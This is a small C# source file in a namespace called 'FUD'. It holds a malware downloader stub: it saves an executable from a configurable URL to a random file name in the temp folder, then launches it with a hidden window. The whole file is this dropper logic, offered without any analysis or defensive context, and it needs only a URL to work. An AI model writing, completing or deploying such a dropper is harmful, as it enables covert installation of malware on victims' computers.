using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace FUD
{
	internal class Program
	{
		private static void Main(string[] args)
		{
			string url = "";
			string fileLocate = Program.FileName();
			Program.FileName();
			Program.Download(fileLocate, url);
			Program.Runprocess(fileLocate);
		}

		private static void Download(string FileLocate, string url)
		{
			new WebClient().DownloadFile(new Uri(url), FileLocate + ".exe");
		}

		private static string FileName()
		{
			string tempPath = Path.GetTempPath();
			string Ran = Path.GetRandomFileName();
			return tempPath + Ran;
		}

		private static void Runprocess(string FileLocate)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = FileLocate + ".exe",
					WindowStyle = ProcessWindowStyle.Hidden
				}
			}.Start();
		}
	}
}
